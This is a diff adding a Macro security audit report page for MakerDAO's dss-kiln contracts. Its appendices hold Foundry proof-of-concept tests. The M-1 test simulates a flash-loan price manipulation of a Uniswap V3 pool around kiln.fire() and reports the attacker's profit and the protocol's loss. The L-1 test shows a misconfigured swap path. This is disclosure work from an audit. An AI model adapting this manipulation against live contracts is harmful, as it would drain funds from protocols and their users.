@@ -1,0 +1,201 @@
+<page clientName="Maker" reportDate="December 12th, 2022" auditTitle="Maker A-1" auditVersion="1.0.0"
+  repoUrl="https://github.com/makerdao/dss-kiln"
+  layout="/library/audits/_layout.html" customRepoInfo customReviewInfo
+  appendixLinks="#appendix-m1-poc::M-1 Proof of Concept;;#appendix-l1-poc::L-1 Proof of Concept">
+  <content-for name="schedule">
+    The security audit was performed by the Macro security team from November
+    7, 2022 to November 15, 2022.
+  </content-for>
+
+  <content-for name="spec">
+    <ul>
+      <li>Discussions on Discord with the {{page.clientName}} team.</li>
+      <li>Available documentation in the repository.</li>
+      <li>{{page.clientName}} forum posts.</li>
+    </ul>
+  </content-for>
+
+
+  <content-for name="repo-info">
+    <ul>
+      <li>
+        <a href="{{page.repoUrl}}" target="_blank">
+          Repository
+        </a>
+      </li>
+      <li class="break-words break-all">
+        Commit Hash:
+        <code>a4bd20c8c57a6dcb3535d3568a91e16c5353a831</code>
+      </li>
+    </ul>
+  </content-for>
+
+  <content-for name="source-code">
+
+    <p>Specifically, we audited the following contracts within this repository:</p>
+
+    <template type="file-hashes">
+      8d1472d66cd80ec603b8af4cc67285828ebb881649740ed0cdd8483d03563b26 src/KilnBase.sol
+      d3555e1632737cf8081e5af1071082068e0bea433996e362a23a80d98929b407 src/KilnMom.sol
+      854413a5c76466a83d4395cf52c426ff4719b3741a302f63326c2d302c73ca91 src/KilnUniV3.sol
+      00f1d1177402eb1b357aaaff9d9b9ec9ea1bebfbec824e5356132e2bf121a76b src/univ3/BytesLib.sol
+      1269930ef6e87e6ae4360b4f69648a9573a59ab7992f52d3482e633640150121 src/univ3/FullMath.sol
+      857fc0e551c747eadddfe9939ed0a298c1c4671a584bd5c686b2796f0c2da05a src/univ3/Path.sol
+      c4ff4a56501ae3a7a69bcb6b92fe167ce6ced7fa1981cb57d75297528e399b0a src/univ3/PoolAddress.sol
+      59348d5875ca1efa02deb639ccf5fa643f4327dc0aafcba16889e565df2175db src/univ3/TickMath.sol
+      c8f3f34144c75a4cc2359d9e863408ec6cbe40f14ed581cf31379846a6581cf6 src/univ3/TwapProduct.sol
+    </template>
+
+  </content-for>
+
+  <content-for name="appendix">
+    <section id="appendix-m1-poc" class="Copy py-16">
+      <template type="audit-markdown">
+## M-1: Proof of Concept
+
+
+To compute the arbitrage loss, this proof of concept 
+
+1. assumes a lag of 10% bwtween a) TWAP oracle b) spot price happened on Nov 17th, 2022 on mainnet (block number 15992230) and
+1. it uses the Uniswap V3 MKR-ETH 0.3% pool as the trading venue
+
+**Findings**
+
+Using a flash loan of `235 WETH`:
+
+- **Attacker profits `0.419 WETH`** before accounting for gas or priority fee
+- **MakerDAO’s slippage loss is `3.649 MKR`**
+
+As per our conversations, Maker's initial plan is to execute `fire()` of lot size `30,000 DAI` for 100 times for a total of 3 million DAI. 
+
+**Considering the worst case where the 10% lag is present for each call to** `fire()`, **the estimated loss for MakerDAO would be** `364.9 MKR` **, with the attacker gaining** `41.9 WETH` **for the plan above.**
+
+`364.9 MKR` * `$660.00` (current market price of `MKR`) = `$240,834` loss for MakerDAO.
+
+`$240,834` / 3 million DAI => **an overall loss of 8.0278%**
+
+**Proof of Concept**
+
+```solidity
+	
+// forge test --use solc:0.8.14 --rpc-url=$ETH_RPC_URL --match testTWAPMispriceShortPath --fork-block-number 15992230 -vvvv
+
+// Copy into existing KilnUniV3.t.sol
+contract Attacker {}
+
+// Same as swap but paths are WETH->MKR or MKR->WETH and to arg
+
+function shortRecipSwap(address gem, uint256 amount, address to) public {
+    require(GemLike(gem).approve(kiln.uniV3Router(), amount));
+
+    bytes memory _path;
+    if (gem == WETH) {
+        _path = abi.encodePacked(WETH, uint24(3000), MKR);
+    } else {
+        _path = abi.encodePacked(MKR, uint24(3000), WETH);
+    }
+
+    ExactInputParams memory params = ExactInputParams(
+        _path,
+        to,                  // recipient
+        block.timestamp,     // deadline
+        amount,              // amountIn
+        0                    // amountOutMinimum
+    );
+
+    SwapRouterLike(kiln.uniV3Router()).exactInput(params);
+  }
+
+function testTWAPMispriceShortPath() public {
+    Attacker attacker = new Attacker(); //just an empty contract
+
+    kiln.file("lot", 30_000 * WAD); // drop to expected lot size
+    //use this as a proxy for quote returning amountOut value that is 10% lower than spot price
+    kiln.file("yen", 90 * WAD / 100); 
+    kiln.file("scope", 4 hours);
+
+    mintDai(address(kiln), 30_000 * WAD);
+
+    assertEq(GemLike(DAI).balanceOf(address(kiln)), 30_000 * WAD);
+    uint256 mkrSupply = TestGem(MKR).totalSupply();
+    assertTrue(mkrSupply > 0);
+
+    uint256 _est = estimate(30_000 * WAD);
+    assertTrue(_est > 0);
+    assertEq(GemLike(MKR).balanceOf(address(attacker)), 0);
+
+    //-------Start attack executing atomically----------
+    vm.startPrank(address(attacker));
+
+    uint256 loanAmt = 235 ether; // .419 ether profit, 3.649 mkr loss
+
+    mintWeth(address(attacker), loanAmt); // funds for manipulating prices, assume this was flash loaned
+
+    // drive down MKR out amount with big WETH->MKR swap
+    shortRecipSwap(WETH, loanAmt, address(attacker)); //same as recipSwap, just with shorter paths
+
+    kiln.fire();
+
+    assertTrue(GemLike(DAI).balanceOf(address(kiln)) < 30_000 * WAD);
+    assertLt(GemLike(MKR).balanceOf(address(user)), _est);
+
+    shortRecipSwap(MKR, GemLike(MKR).balanceOf(address(attacker)), address(attacker));
+    assertGt(GemLike(WETH).balanceOf(address(attacker)), loanAmt);
+
+    //payback loan with interest
+    uint256 flashLoanFee = loanAmt * 9 / 10_000;
+    GemLike(WETH).transfer(WETH, loanAmt + flashLoanFee);
+
+    vm.stopPrank();
+    //----------End attack atomic execution-------------
+
+    console.log("Attacker profit: %s", GemLike(WETH).balanceOf(address(attacker)));
+    console.log("Kiln receiver MKR Loss: %s ", (_est - GemLike(MKR).balanceOf(address(user))));
+    console.log("Kiln receiver MKR Loss: %s WAD", (_est - GemLike(MKR).balanceOf(address(user))) / WAD);
+}
+```
+
+**Technical Notes**
+
+- `yen = 90 * WAD / 100` AND `quote` returning value close to spot price `amountOut`
+is equivalent to `yen = WAD`  AND `quote` returning value 10% lower than spot price `amountOut`.
+
+- Please note for validation purpose, we have set `yen = 90 * WAD / 100` in this test to duplicate the behavior of the lagging quote.
+      </template>
+    </section>
+  </content-for>
+
+<content-for name="appendix">
+  <section id="appendix-l1-poc" class="Copy py-16">
+    <template type="audit-markdown">
+	## L-1: Proof of Concept
+
+To demonstrate the issue, copy the following content into `src/KilnUniV3.t.sol` and run `forge test --use solc:0.8.14 --rpc-url="$ETH_RPC_URL" -vvv --match-test testFireWithIncorrectBuyPath`.
+
+```
+function testFireWithIncorrectBuyPath() public {
+    mintDai(address(kiln), 50_000 * WAD);
+
+    assertEq(GemLike(MKR).balanceOf(address(user)), 0);
+
+    kiln.file("yen", 80 * WAD / 100);
+
+    assertEq(GemLike(WETH).balanceOf(address(user)), 0);
+
+    // Configure path to buy WETH
+    kiln.file("path", abi.encodePacked(DAI, uint24(100), USDC, uint24(500), WETH));
+    assertEq(kiln.path(), abi.encodePacked(DAI, uint24(100), USDC, uint24(500), WETH));
+
+    // Show that kiln buy is still MKR
+    assertEq(kiln.buy(), MKR);
+    kiln.fire();
+
+    // Swap results in acquiring the non-buy token
+    assertEq(GemLike(MKR).balanceOf(address(user)), 0);
+    assertTrue(GemLike(WETH).balanceOf(address(user)) > 0);
+}
+```
+    </template>
+  </section>
+</content-for>
+</page>
